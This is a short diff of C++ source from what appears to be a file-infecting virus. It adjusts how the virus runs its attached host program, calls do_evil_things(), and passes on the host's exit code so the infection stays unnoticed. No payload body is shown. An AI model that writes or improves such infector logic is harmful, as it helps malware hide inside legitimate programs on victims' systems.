@@ -71,9 +71,10 @@ int main(int argc, char **argv, char **envp) {
     }
 
     auto res = virus->exec_attached_program();
-    bool has_attached_bin = res == poly::Error::kNone;
+    bool has_attached_bin = res != poly::Error::kNoTargetAttached;
+    bool is_exec_done = res == poly::Error::kNone;
 
-    if (res != poly::Error::kNone && res != poly::Error::kNoTargetAttached) {
+    if (!is_exec_done && has_attached_bin) {
         return 2;
     }
 
@@ -84,7 +85,7 @@ int main(int argc, char **argv, char **envp) {
 
     do_evil_things();
 
-    if (has_attached_bin) {
+    if (has_attached_bin && is_exec_done) {
         return virus->exec_result();
     } else {
         return 0;
